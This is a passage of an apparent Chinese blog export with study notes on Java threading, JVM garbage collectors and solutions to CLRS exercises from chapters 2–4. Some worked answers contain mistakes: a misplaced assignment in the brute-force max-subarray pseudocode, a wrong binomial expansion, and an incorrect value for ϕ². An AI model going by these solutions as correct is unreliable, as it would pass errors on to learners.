<p>第三，将Sogou方法的锁改为其他.class锁，那么，HelloSogou和SogouHello都可能出现。因为没有互斥现象了，变为<code>抢占式</code>的了。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>牛客网</tag>
        <tag>多线程</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>一道Java垃圾回收问题</title>
    <url>/2019/12/19/%E4%B8%80%E9%81%93Java%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>初读《深入理解JVM虚拟机》，随即便碰到了这道题目，刚好对所学进行了一个总结归纳，对这道题目做了解析，这几年获得了400多赞，对我的Java学习之路起到了积极作用。</p>
<a id="more"></a>
<p>以下哪些jvm的垃圾回收方式采用的是复制算法回收：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">A. 新生代串行收集器</span><br><span class="line">B. 老年代串行收集器</span><br><span class="line">C. 并行收集器</span><br><span class="line">D. 新生代并行回收收集器</span><br><span class="line">E. 老年代并行回收收集器</span><br><span class="line">F. cms收集器</span><br><span class="line">回答链接：https:<span class="comment">//www.nowcoder.com/questionTerminal/795b066b67c84478aec4dc400b3d0153?toCommentId=88925</span></span><br></pre></td></tr></table></figure>
<h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><p>两个最基本的java回收算法：复制算法和标记清理算法<br><code>复制算法</code>：两个区域A和B，初始对象在A，继续存活的对象被转移到B。此为新生代最常用的算法<br><code>标记清理</code>：一块区域，标记可达对象（可达性分析），然后回收不可达对象，会出现碎片，那么引出<br><code>标记-整理算法</code>：多了碎片整理，整理出更大的内存放更大的对象<br>两个概念：新生代和年老代<br><code>新生代</code>：初始对象，生命周期短的<br><code>永久代</code>：长时间存在的对象<br>整个java的垃圾回收是新生代和年老代的协作，这种叫做分代回收。<br>P.S：Serial New收集器是针对新生代的收集器，采用的是复制算法<br>Parallel New（并行）收集器，新生代采用复制算法，老年代采用标记整理<br>Parallel Scavenge（并行）收集器，针对新生代，采用复制收集算法<br>Serial Old（串行）收集器，新生代采用复制，老年代采用标记整理<br>Parallel Old（并行）收集器，针对老年代，标记整理<br>CMS收集器，基于标记清理<br>G1收集器：整体上是基于标记 整理 ，局部采用复制</p>
<p><code>综上：新生代基本采用复制算法，老年代采用标记整理算法。cms采用标记清理。</code></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java垃圾回收</tag>
        <tag>牛客网</tag>
      </tags>
  </entry>
  <entry>
    <title>算法导论-第4章-分治策略</title>
    <url>/2019/12/08/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E7%AC%AC4%E7%AB%A0-%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<p><strong>4.1-1</strong>    What does FIND-MAXIMUM-SUBARRAY return when all elements of A are negative?</p>
<p>答：返回数组中最大的负数，根据high==low的情况可以知道两个元素时，是单一元素；对于跨越mid的判断，sum越来越小，所以只会保存一个元素，最终得到两个元素；它的和一定小。</p>
<a id="more"></a>
<p><strong>4.1-2</strong>    Write pseudocode for the brute-force method of solving the maximum-subarray problem. Your procedure should run in Θ(n2) time.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">FIND-MAX-SUBARRAY(A, low, high)</span><br><span class="line">  left = <span class="number">0</span></span><br><span class="line">  right = <span class="number">0</span></span><br><span class="line">  sum = -∞</span><br><span class="line">  <span class="keyword">for</span> i = low to high</span><br><span class="line">      currentSum = <span class="number">0</span></span><br><span class="line">      <span class="keyword">for</span> j = i to high</span><br><span class="line">      currentSum += A[j]</span><br><span class="line">      <span class="keyword">if</span> sum &lt; currentSum</span><br><span class="line">          sum = currentSum</span><br><span class="line">      left = i</span><br><span class="line">      right = j</span><br><span class="line">  <span class="keyword">return</span> (left, right, sum)</span><br></pre></td></tr></table></figure>
<p><strong>4.1-3</strong>    Implement both the brute-force and recursive algorithms for the maximum-subarray problem on your own computer. What problem size n0 gives the crossover point at which the recursive algorithm beats the brute-force algorithm? Then, change the base case of the recursive algorithm to use the brute-force algorithm whenever the problem size is less than n0. Does that change the crossover point?</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CROSSOVER_POINT 37</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// A struct to represent the tuple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> left;</span><br><span class="line">    <span class="keyword">unsigned</span> right;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">&#125; max_subarray;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The brute force approach</span></span><br><span class="line"></span><br><span class="line"><span class="function">max_subarray <span class="title">find_maximum_subarray_brute</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">unsigned</span> low, <span class="keyword">unsigned</span> high)</span> </span>&#123;</span><br><span class="line">    max_subarray result = &#123;<span class="number">0</span>, <span class="number">0</span>, INT_MIN&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = low; i &lt; high; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> current_sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; high; j++) &#123;</span><br><span class="line">            current_sum += A[j];</span><br><span class="line">            <span class="keyword">if</span> (result.sum &lt; current_sum) &#123;</span><br><span class="line">                result.left = i;</span><br><span class="line">                result.right = j + <span class="number">1</span>;</span><br><span class="line">                result.sum = current_sum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The divide-and-conquer solution</span></span><br><span class="line"></span><br><span class="line"><span class="function">max_subarray <span class="title">find_max_crossing_subarray</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">unsigned</span> low, <span class="keyword">unsigned</span> mid, <span class="keyword">unsigned</span> high)</span> </span>&#123;</span><br><span class="line">    max_subarray result = &#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>,</span><br><span class="line">        left_sum = INT_MIN,</span><br><span class="line">        right_sum = INT_MIN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = mid - <span class="number">1</span>; i &gt;= (<span class="keyword">int</span>) low; i--) &#123;</span><br><span class="line">        sum += A[i];</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; left_sum) &#123;</span><br><span class="line">            left_sum = sum;</span><br><span class="line">            result.left = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = mid; j &lt; high; j++) &#123;</span><br><span class="line">        sum += A[j];</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; right_sum) &#123;</span><br><span class="line">            right_sum = sum;</span><br><span class="line">            result.right = j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    result.sum = left_sum + right_sum;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">max_subarray <span class="title">find_maximum_subarray</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">unsigned</span> low, <span class="keyword">unsigned</span> high)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (high == low + <span class="number">1</span>) &#123;</span><br><span class="line">        max_subarray result = &#123;low, high, A[low]&#125;;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        max_subarray left = find_maximum_subarray(A, low, mid);</span><br><span class="line">        max_subarray right = find_maximum_subarray(A, mid, high);</span><br><span class="line">        max_subarray cross = find_max_crossing_subarray(A, low, mid, high);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (left.sum &gt;= right.sum &amp;&amp; left.sum &gt;= cross.sum) &#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (right.sum &gt;= left.sum &amp;&amp; right.sum &gt;= cross.sum) &#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> cross;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The mixed algorithm</span></span><br><span class="line"></span><br><span class="line"><span class="function">max_subarray <span class="title">find_maximum_subarray_mixed</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">unsigned</span> low, <span class="keyword">unsigned</span> high)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (high - low &lt; CROSSOVER_POINT) &#123;</span><br><span class="line">        <span class="keyword">return</span> find_maximum_subarray_brute(A, low, high);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        max_subarray left = find_maximum_subarray_mixed(A, low, mid);</span><br><span class="line">        max_subarray right = find_maximum_subarray_mixed(A, mid, high);</span><br><span class="line">        max_subarray cross = find_max_crossing_subarray(A, low, mid, high);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (left.sum &gt;= right.sum &amp;&amp; left.sum &gt;= cross.sum) &#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (right.sum &gt;= left.sum &amp;&amp; right.sum &gt;= cross.sum) &#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> cross;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>交叉点需要自行在机器上测试，不同机器的交叉点有所不同。</p>
<p><strong>4.1-4</strong>    Suppose we change the definition of the maximum-subarray problem to allow the result to be an empty subarray, where the sum of the values of an empty subarray is 0. How would you change any of the algorithms that do not allow empty subarrays to permit an empty subarray to be the result?</p>
<p>答：只有当最大子数组的和为负时，我们才希望返回一个空子数组。因此，我们可以修改算法来检查它将返回的和是否为负，我们将返回空的子数组。</p>
<p>另一种：我们可以将left-sum和right-sum初始化为0而不是-∞，因为我们不会接受任何负和作为答案。</p>
<p><strong>4.1-5</strong>    Use the following ideas to develop a nonrecursive, linear-time algorithm for the maximum-subarray problem. Start at the left end of the array, and progress toward the right, keeping track of the maximum subarray seen so far. Knowing a maximum subarray of A[1…j], extend the answer to find a maximum subarray ending at index j+1 by using the following observation: a maximum subarray of A[1…j+1] is either a maximum subarray of A[1…j] or a subarray A[i…j+1], for some 1≤i≤j+1. Determine a maximum subarray of the form A[i…j+1] in constant time based on knowing a maximum subarray ending at index j.</p>
<p>答：</p>
<blockquote>
<p>The idea is to determine whether A[j+1] will be part of the maximum subarray of A[1…j+1] or not. If it is a part of the maximum subarray, then we will update our returning maximum subarray to include A[j+1], otherwise we will maintain a temporary sum including A[j+1] in case we encounter a sufficiently large element later which can make the future sum greater than the present sum.</p>
</blockquote>
<p>可见：<a href="/2017/06/16/121-Best-Time-to-Buy-and-Sell-Stock/" title="121. Best Time to Buy and Sell Stock">121. Best Time to Buy and Sell Stock</a></p>
]]></content>
      <categories>
        <category>算法</category>
        <category>算法导论</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>算法导论</tag>
      </tags>
  </entry>
  <entry>
    <title>算法导论-第3章-函数的增长</title>
    <url>/2019/12/06/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E7%AC%AC3%E7%AB%A0-%E5%87%BD%E6%95%B0%E7%9A%84%E5%A2%9E%E9%95%BF/</url>
    <content><![CDATA[<p><strong>Θ记号</strong>：标记了函数的渐进上界和渐进下界</p>
<p><strong>O记号</strong>：标记了函数的渐进上界</p>
<p><strong>Ω记号</strong>：标记了函数的渐进下界</p>
<p><strong>o记号</strong>：表示一个非渐进紧确的上界</p>
<p><strong>ω记号</strong>：表示一个非渐进紧确的下界</p>
<a id="more"></a>
<p>这里在学习的时候，当看到<strong>o记号</strong>时，突然反应过来，这不就是微积分里的<strong>等价无穷小</strong>，进而得以联想，进行理解。</p>
<p><strong>3.1-1</strong>    Let f(n) + g(n) be asymptotically nonnegative（渐进非负） functions. Using the basic definition of Θ-notation, prove that $max(f(n),g(n))=Θ(f(n)+g(n))$.</p>
<p>证明：从渐进非负函数，我们得到：</p>
<p>$∃n_1,n_2:f(n)≥0,当n&gt;n_1$</p>
<p>$g(n)≥0, 当n&gt;n_2$</p>
<p>令$ n_0=max(n_1,n_2)$。则对于任意$n&gt;n_0$:</p>
<p>$f(n)≤max(f(n),g(n))$</p>
<p>$g(n)≤max(f(n),g(n))$</p>
<p>$(f(n)+g(n))/2≤max(f(n),g(n))$</p>
<p>$max(f(n),g(n))≤f(n)+g(n)$</p>
<p>根据上面两个等式，我们得到了：</p>
<p>$0≤{1\over2}(f(n)+g(n))≤max(f(n),g(n))≤f(n)+g(n),当n&gt;n_0$</p>
<p> 所以，$max(f(n),g(n)) = Θ(f(n)+g(n))$当c1=1/2,c2=1时。</p>
<p><strong>3.1-2</strong>    Show that for any real constants a and b, where b&gt;0,$(n+a)^b=Θ(n^b)$</p>
<p>证明：$(n+a)^b=\dbinom{n}{0}n^b+\dbinom{n}{1}n^{b−1}b+⋯+\dbinom{n}{0}a^b$</p>
<p>可以看出，$n^b$是它的最高阶的项，所以$(n+a)^b=Θ(n^b)$。</p>
<p><strong>3.1-3</strong>    Explain why the statement, “The running time of algorithm A is at least O(n2) is meaningless.</p>
<p>答：因为大写O标记的是上确界，而最少表示下确界，所以无意义。</p>
<p><strong>3.1-4</strong>    Is $2^{n+1}=O(2^n)$? Is $2^{2n}=O(2^n)$?</p>
<p>答：只要确定是否存在c，使得$2^{n+1}≤c2^n$？存在，c≥2时满足。</p>
<p>是否存在c，使得$2^{2n}≤c2^n$？不存在。</p>
<p><strong>3.1-5</strong>    Prove Theorem 3.1</p>
<p><strong>定理3.1</strong>：对任意的两个函数f(n)和g(n)，我们有$f(n)= Θ(g(n))$，当且仅当$f(n)=O(g(n))$且$f(n)=Ω(g(n))$</p>
<p>证明：由$f(n)=Θ(g(n)) $，我们可以得到：</p>
<p>$0≤c_1g(n)≤f(n)≤c_2g(n),当n&gt;n0$</p>
<p>我们可以在这里选择常量，去定义O和Ω：</p>
<p>对于$f(n)=Ω(g(n))$ 和 $f(n)=O(g(n))$：</p>
<p>$0≤c_3g(n)≤f(n)，对于所有的n≥n_1$</p>
<p>$0≤f(n)≤c_4g(n)，对于所有的n≥n_2$</p>
<p>如果我们选择$n3=max(n1,n2)$ ，然后合并这两个不等式，则：</p>
<p>$0≤c_3g(n)≤f(n)≤c_4g(n)，对于所有的n&gt;n_3$<br>这样就定义了Θ。</p>
<p><strong>3.1-6</strong>    Prove that the running time of an algorithm is Θ(g(n)) if and only if its worst-case running time is O(g(n)) and its best-case running time is Ω(g(n)).</p>
<p>证明：令$T_w$是最坏运行时间，$T_b$是最好运行时间，我们由已知可以得到：</p>
<p>$0≤c_1g(n)≤T_b(n)，对于n&gt;n_b$</p>
<p>$0≤T_w(n)≤c_2g(n)，对于n&gt;n_w$<br>合并这两个不等式，则：</p>
<p>$0≤c_1g(n)≤T_b(n)≤T_w(n)≤c2g(n)，对于n&gt;max(n_b,n_w)$</p>
<p>由于运行时间是绑定在$T_w$和之$T_b$间的，所以上述证明了Θ符号。</p>
<p><strong>3.1-7</strong>    Prove o(g(n))∩ω(g(n)) is the empty set.</p>
<p>证明：由已知可得，对于任意的正整数c：</p>
<p>$∃n_1&gt;0:0≤f(n)&lt;cg(n)$</p>
<p>$∃n_2&gt;0:0≤cg(n)&lt;f(n)$<br>如果我们选择 $n0=max(n1,n2)$，由以上的我们可以得到：</p>
<p>$f(n)&lt;cg(n)&lt;f(n)$</p>
<p>它显然没有解。这意味着交集是空集。</p>
<p><strong>3.1-8</strong>    We can extend our notation to the case of two parameters n and m that can go to infinity independently at different rates. For a given function g(n,m) we denote O(g(n,m)) the set of functions:</p>
<blockquote>
<p>O(g(n,m)={f(n,m):there exist positive constants c,n0, and m0such that 0≤f(n,m)≤cg(n,m)for all n≥n0 or m≥m0}</p>
</blockquote>
<p>Give corresponding definitions for Ω(g(n,m)) and Θ(g(n,m)).</p>
<p>答：</p>
<blockquote>
<p>$Ω(g(n,m)={f(n,m):存在正正整数 c,n_0, and m_0,使得0≤cg(n,m)≤f(n,m)对所有的n≥n_0或m≥m_0}$<br>$Θ(g(n,m)={f(n,m):存在正正整数 c_1,c_2,n_0, 和 m_0 使得0≤c_1g(n,m)≤f(n,m)≤c_2g(n,m)对所有的n≥n_0 或 m≥m_0}$</p>
</blockquote>
<p><strong>3.2-1</strong>    Show that if f(n) and g(n) are monotonically increasing functions, then so are the functions f(n)+g(n) and f(g(n)), and if f(n) and g(n) are in addition nonnegative, then f(n)⋅g(n) is monotonically increasing.</p>
<p>证明：$f(m)≤f(n), m≤n$</p>
<p>$g(m)≤f(n),m≤n$</p>
<p>所以，$f(m)+g(m)≤f(n)+g(n),m≤n$</p>
<p>$f(g(m))≤f(g(n)),m≤n$</p>
<p>因为$g(m)&gt;g(n)$  且 f(n) 是单调递增的。</p>
<p>因为f(n)和g(n)都是非负的，所以将两个不等式相乘得：</p>
<p>$f(m)⋅g(m)≤f(n)⋅g(n)$</p>
<p><strong>3.2-2</strong>    Prove equation (3.16)</p>
<p>$a^{log_bc}=c^{log_ba}$</p>
<p>证明：$a^{log_bc}=b^{log_ba \cdot log_bc}=b^{log_bc \cdot log_ba}=c^{log_ba}$</p>
<p><strong>3.2-3</strong>    Prove equation (3.19). Also prove that $n!=ω(2^n) $and $n!=o(n^n)$.</p>
<p>$lg(n!)=Θ(nlgn)$(3.19)</p>
<p>证明：我们使用斯特林近似公式：</p>
<p>$lg(n!)=lg(\sqrt{2πn}({n\over e})^n(1+Θ({1\over n}))=lg(\sqrt{2πn})+lg({n\over e})^n+lg(Θ(1)+Θ({1\over n}))=Θ(n^{1\over 2})+nlg({n\over e})+lg({1\over n})=Θ(n^{1\over 2})+Θ(nlgn)+Θ({1\over n})$</p>
<p>其余两个的证明很明显：</p>
<p>$∀n&gt;3:2^n= \underbrace{2⋅2⋅⋯⋅2}_{\text{n个}} &lt;1⋅2⋅⋯⋅n=n!⇒n!=ω(2^n)$</p>
<p>$∀n&gt;1:n!= 1⋅2⋅⋯⋅n &lt; \underbrace{n⋅n⋅⋯⋅n}_{\text{n个}}=n^n⇒n!=o(n^n)$</p>
<p><strong>3.2-4</strong>    * Is the function ⌈lgn⌉! polynomially bounded? Is the function ⌈lglgn⌉ polynomially bounded?</p>
<p>证明：由多项式定义可得：</p>
<p>$f(n)≤cn^k$</p>
<p>两边取对数得：</p>
<p>$lgf(n)≤lgc+klgn$</p>
<p>所以：$lgf(n)=O(lgn)$，即$lgf(n)≤clgn=lgn^c$，$f(n)≤n^c$</p>
<p>由<strong>3.19</strong>可知，$lg(n!)=Θ(nlgn)$，得：</p>
<p>$lg(lglgn!)=Θ(lglgnlglglgn)$</p>
<p>因为对于任意的n&gt;1，${lglglgn}&lt;{lglgn}$，则存在常数$c和n_0$，使得$n&gt;=n_0$时，$lg(f(n))&lt;=c(lglgn)^2$</p>
<p>$Θ(lglgnlglglgn)=o(lglgn)^2=o(lgn)$(最后一个结论来自本章的论述，即多对数函数比多项式函数增长得慢。)</p>
<p><strong>3.2-5</strong>    * Which is asymptotically larger: $lg(lg^{*}n)$or$lg^{*}{(lg{n})}$.</p>
<p>答：第二个大，因为$lg^*n = lglglg……n=i$</p>
<p>所以$lg^*{(lg{n})}=lg^*n-1=i-1$</p>
<p>而$lg(lg^*n)=lg(i)$，由于P33页多对数函数比多项式函数增长得慢。所以$lg^*(lg{n})$的渐进大。</p>
<p><strong>3.2-6</strong>    Show that the golden ratio ϕ and its conjugate $\hat{ϕ}$ both satisfy the equation $x^2=x+1$.</p>
<p>证明：直接代入计算：$ϕ^2−ϕ−1=({(1+\sqrt{5})\over 2})^2−{(1+\sqrt{5})\over 2}−1={1+2\sqrt {5}+5−2−2\sqrt{5}-4\over 4}=0$</p>
<p>$\hat{ϕ}^2−\hat{ϕ}−1=({(1-\sqrt{5})\over 2})^2−{(1-\sqrt{5})\over 2}−1={1-2\sqrt {5}+5−2+2\sqrt{5}-4\over 4}=0$</p>
<p><strong>3.2-7</strong>    Proove by induction that the ith Fibonacci number satisfies the equality</p>
<p>$F_i={ϕ^i−\hat{ϕ}^i\over {\sqrt{5}}}$</p>
<p>证明：${ϕ^0−\hat{ϕ}^0\over {\sqrt{5}}}={1−1\over \sqrt{5}}=0=F_0$</p>
<p>${ϕ^1−\hat{ϕ}^1\over {\sqrt{5}}}={1+\sqrt{5}−1++\sqrt{5}\over 2\sqrt{5}}=1=F_1$</p>
<p>$F_{n+2}=F_{n+1}+F_n={ϕ^{n+1}−\hat{ϕ}^{n+1}\over {\sqrt{5}}}+{ϕ^{n}−\hat{ϕ}^{n}\over {\sqrt{5}}}={ϕ^{n}(ϕ+1)−\hat{ϕ}^{n}(\hat{ϕ}+1)\over {\sqrt{5}}}={ϕ^{n}ϕ^{2}−\hat{ϕ}^{n}\hat{ϕ}^{2}\over {\sqrt{5}}}={ϕ^{n+2}−\hat{ϕ}^{n+2}\over {\sqrt{5}}}$</p>
<p>这里，$ϕ+1={1+\sqrt{5} \over {2}}+1={3+\sqrt{5} \over {2}}$</p>
<p>而，$ϕ^2={6+2\sqrt{5} \over {4}}={1+\sqrt{5} \over {2}}$</p>
<p>所以，$ϕ+1=ϕ^2$是成立的，同理$\hat{ϕ}+1=\hat{ϕ}^2$也成立。</p>
<p><strong>3.2-8</strong>    Show that $klnk=Θ(n)$ implies $k=Θ(n/lnn)$.</p>
<p>证明：由P30页对称性知：</p>
<p>$klnk=Θ(n)⇒n=Θ(klnk)$，取对数有：</p>
<p>$lnn=Θ(ln(klnk))=Θ(lnk+lnlnk)=Θ(lnk)$</p>
<p>相除有：</p>
<p>${n\over lnn}={Θ(klnk)\over Θ(lnk)}=Θ{klnk\over lnk}=Θ(k)$</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>算法导论</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>算法导论</tag>
      </tags>
  </entry>
  <entry>
    <title>算法导论-第2章 算法基础</title>
    <url>/2019/12/02/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E7%AC%AC2%E7%AB%A0-%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p><strong>2.1-1</strong>    Using figure 2.4 as a model, illustrate the operations of Insertion-Sort on the array A=⟨31,41,59,26,41,58⟩.</p>
<a id="more"></a>
<p><img src="/images/sfdl-2.1-1.png" alt="Alt text"></p>
<p><strong>2.1-2</strong>    Rewrite the Insertion-Sort procedure to sort into nonincreasing instead of nondecreasing order.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> j = <span class="number">2</span> to A.length</span><br><span class="line">    key = A[j]</span><br><span class="line">    i = j - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span> and A[i] &lt; key</span><br><span class="line">        A[i+<span class="number">1</span>] = A[i]</span><br><span class="line">        i = i - <span class="number">1</span></span><br><span class="line">    A[i+<span class="number">1</span>] = key</span><br></pre></td></tr></table></figure>
<p><strong>2.1-3</strong>    Consider the searching problem:</p>
<p>Input: A sequence of n numbers A=⟨a1,a2,…,an⟩ and a value ν.</p>
<p>Output: And index i such that ν=A[i] or the special value NIL if ν does not appear in A<br>Write the pseudocode for linear search, which scans through the sequence, looking for ν. Using a loop invariant, prove that your algorithm is correct. Make sure that your loop invariant fulfills the three necessary properties.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SEARCH(A, v):</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span> to A.length</span><br><span class="line">      <span class="keyword">if</span> A[i] == v</span><br><span class="line">          <span class="keyword">return</span> i</span><br><span class="line">  <span class="keyword">return</span> NIL</span><br></pre></td></tr></table></figure>
<p><strong>2.1-4</strong>    Consider the problem of adding two n-bit binary integers, stored in two n-element arrays A and B. The sum of the two integers should be stored in binary form in an (n+1)-element array C. State the problem formally and write pseudocode for adding the two integers.</p>
<p><strong>输入</strong>：数组A=⟨a1,a2,…,an⟩和数组B=⟨b1,b2,…,bn⟩，分别代表一个整数存储在二进制格式（每个元素为0或1），长度为n</p>
<p><strong>输出</strong>： 数组C=⟨c1,c2,…,cn+1⟩ ，C′=A′+B′, 其中 A′，B′ 和 C′ 是数组A，B，C中的元素.</p>
<p><strong>伪码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ADD-BINARY(A, B):</span><br><span class="line">  C = <span class="keyword">new</span> integer[A.length + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  carry = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i = A.length to <span class="number">1</span> </span><br><span class="line">      C[i] = (A[i] + B[i] + carry) % <span class="number">2</span>  <span class="comment">// remainder</span></span><br><span class="line">      carry = (A[i] + B[i] + carry) / <span class="number">2</span> <span class="comment">// quotient</span></span><br><span class="line">  C[i] = carry</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> C</span><br></pre></td></tr></table></figure>
<p><strong>2.2-1</strong>    Express the function $n^3/1000−100n^2−100n+3$ in terms of Θ-notation</p>
<p>答：$Θ(n^3)$</p>
<p><strong>2.2-2</strong>    Consider sorting n numbers in an array A by first finding the smallest element of A and exchanging it with the element in A[1]. Then find the second smallest element of A, and exchange it with A[2]. Continue in this manner for the first n−1 elements of A. Write pseudocode for this algorithm, which is known as <strong>selection sort</strong>. What loop invariants does this algorithm maintain? Why does it need to run for only the first n−1 elements, rather than for all n elements? Give the best-case and the worst-case running times of selection sort in Θ-notation.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SELECTION-SORT(A):</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span> to A.length - <span class="number">1</span></span><br><span class="line">      min = i</span><br><span class="line">      <span class="keyword">for</span> j = i + <span class="number">1</span> to A.length</span><br><span class="line">          <span class="keyword">if</span> A[j] &lt; A[min]</span><br><span class="line">              min = j</span><br><span class="line">      temp = A[i]</span><br><span class="line">      A[i] = A[min]</span><br><span class="line">      A[min] = temp</span><br></pre></td></tr></table></figure>
<p>循环不变式：</p>
<blockquote>
<p>在外部for循环的每次迭代开始时，子数组A[1..i−1]包含数组中最小的i−1元素，按非递减顺序排列。<br>在内部for循环的每次迭代开始时，A[min]是子数组A[i..j−1]中的最小值。</p>
</blockquote>
<p>为什么是n-1步？</p>
<blockquote>
<p>在最后一步，算法将剩下两个元素进行比较。它将较小的一个存储在[n−1]中，较大的一个存储在[n]中。最后一个元素将是数组中最大的元素，因为之前的迭代除了最后两个元素(外循环不变元素)之外，其他元素都已排序。如果我们这样做n次，我们将得到一个冗余的步骤来排序一个单元素子数组。</p>
</blockquote>
<p>运行时间：</p>
<blockquote>
<p>在最佳情况下(数组已排序)，不会调用if的主体。操作数(将比较算为一个操作)为:</p>
<p>$(n−1)(\frac{n+2}{2}+4)$  </p>
<p>在最坏情况下的时间(数组反转)，每次调用if的主体，使内部循环的步数加倍，即:</p>
<p>$(n−1)(n+6)$<br>两者的时间复杂度都是：$Θ(n^2)$.</p>
</blockquote>
<p><strong>2.2-3</strong>     Consider linear search again (see exercise 2.1-3). How many elements of the input sequence need to be checked on the average, assuming that the element being searched for is equally likely to be any element in the array? How about the worst case? What are the average-case and worst-case running times of linear search in Θ-notation? Justify your answers.</p>
<blockquote>
<p>平均检查$n/2$个元素，最坏情况则检查n个元素。</p>
<p>两者的时间复杂度都为$Θ(n)$.</p>
</blockquote>
<p><strong>2.2-4</strong>    How can we modify almost any algorithm to have a good best-case running time?</p>
<blockquote>
<p>应该检查其特殊情况，有序时则直接返回结果，那么其时间复杂度为$Θ(n)$</p>
</blockquote>
<p><strong>2.3.1</strong> </p>
<blockquote>
<p>Many useful algorithms are recursive in structure: to solve a given problem, they call themselves recursively one or more times to deal with closely related subproblems. These algorithms typically follow a divide-and-conquer approach: they break the problem into several subproblems that are similar to the original problem but smaller in size, solve the subproblems recursively, and then combine these solutions to create a solution to the original problem.</p>
